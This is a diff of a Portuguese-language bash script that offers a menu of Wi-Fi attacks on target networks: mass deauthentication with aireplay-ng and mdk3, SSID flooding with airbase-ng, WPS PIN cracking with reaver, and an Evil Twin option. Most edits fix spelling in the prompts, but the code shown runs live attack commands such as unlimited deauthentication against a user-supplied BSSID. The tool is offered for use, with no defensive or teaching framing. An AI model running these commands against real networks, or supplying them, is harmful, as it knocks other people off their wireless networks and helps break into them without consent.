@@ -17,18 +17,18 @@ while true
 do
 clear
 echo "*********************************************************"
-echo "*******************Selecione a Opção*********************"
+echo "****************** Selecione a Opção ********************"
 echo "*********************************************************"
 echo "**                                                    ***"
 echo "** 1. Ataca uma Rede                                  ***"
 echo "** 2. Ataca duas Redes                                ***"
 echo "** 3. Ataca Uma Rede (Macchanger)                     ***"
 echo "** 4. Ataca Com Mdk3,Aireplay-ng,Macchanger           ***"
-echo "** 5. Criar 50 Rede Com Airbase-ng (Inundação SSID)   ***"
-echo "** 6. Essa Zuera e Com Mdk3 (Inundação SSID)          ***"
-echo "** 7. Desaltenticação em Massa Derruba Ate a Sua Rede ***"
+echo "** 5. Criar 50 Redes Com Airbase-ng (Inundação SSID)   ***"
+echo "** 6. Mdk3 (Inundação SSID)          ***"
+echo "** 7. Desautenticação em Massa Derruba Ate a Sua Rede ***"
 echo "** 8. Ataca 6 Redes (Aireplay-ng)       ***"
-echo "** 9. Descobre ou Tenta  a Senha Metodo WPS (Reaver)  ***"
+echo "** 9. Descobre ou Tenta a Senha Metodo WPS (Reaver)  ***"
 echo "** 10. Reinicia Sua Placa(Normal)                     ***"
 echo "**                                                    ***"
 echo "*********************************************************"
@@ -53,11 +53,9 @@ echo "Vamos Fixar o Canal na Interface"
 clear
 echo "Aguarde ..."
 (xterm -title "$ESSID" -e airodump-ng $WIRELLES --bssid $BSSID --channel $CANAL)
-Sleep 3
-killall airodump-ng
 clear
-echo "Otimo Agora o Ataque Começa Aperte Crtl+c Pra Para o Ataque"
-read -p "Precione Qualquer Tecla Para Iniciar o Ataque"
+echo "Otimo agora o ataque começa aperte Crtl+c para encerrar o ataque"
+read -p "Pressione Qualquer Tecla Para Iniciar o Ataque"
 (xterm -e aireplay-ng -0 0 -a $BSSID $WIRELLES);;
 
 2)clear
@@ -69,7 +67,7 @@ echo "Otimo!"
 echo "Informe o BSSID da 1 Rede Alvo:"
 read BSSID
 [[ $BSSID == "" ]]
-echo "Informe o CANAL das Rede Alvo:"
+echo "Informe o CANAL da Rede Alvo:"
 read CANAL
 [[ $CANAL == "" ]]
 echo "Informe o ESSID da 1 Rede Alvo:"
@@ -137,7 +135,7 @@ airodump-ng $WIRELLES --wps
 echo "Informe o BSSID da Rede Alvo:"
 read BSSID
 [[ $BSSID == "" ]]
-echo "Informe o CANAL das Rede Alvo:"
+echo "Informe o CANAL da Rede Alvo:"
 read CANAL
 [[ $CANAL == "" ]]
 echo "Informe o ESSID da Rede Alvo:"
@@ -206,7 +204,7 @@ sleep 2
 sleep 2
 echo "Bom Isso e Tudo Pessoal !!!" ;;
 5)clear
-echo "O Bom e Quer Voce Pode Fazer o "
+echo "O Bom e Quer Voce Pode Fazer o Evil Twin  "
 echo "Vamos lá"
 clear
 echo "Selecione o Nome da Rede a Ser Repetida SSID:"
